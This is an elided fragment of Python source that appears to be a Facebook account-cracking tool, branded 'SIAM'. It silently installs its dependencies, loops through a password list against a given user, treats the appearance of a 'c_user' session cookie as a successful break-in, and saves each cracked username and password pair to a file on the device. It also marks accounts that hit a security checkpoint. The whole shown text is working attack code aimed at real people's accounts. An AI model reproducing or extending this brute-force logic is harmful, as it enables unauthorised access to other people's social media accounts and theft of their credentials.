...
import os,sys
try: import requests
except ModuleNotFoundError:print("SIAM Install Module requests");os.system("python -m pip install requests &> /dev/SIAM")
try: import bs4
except ModuleNotFoundError:print("SIAm Install Module bs4");os.system("python -m pip install bs4 &> /dev/SIAM")
try: import mechanize
except ModuleNotFoundError:print("SIAM Install Module mechanize");os.system("python -m pip install mechanize &> /dev/SIAM")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/SIAM")
## import in
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[SIAM-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/SIAM_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					pass
				print('\r\033[1;91m[SIAM-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
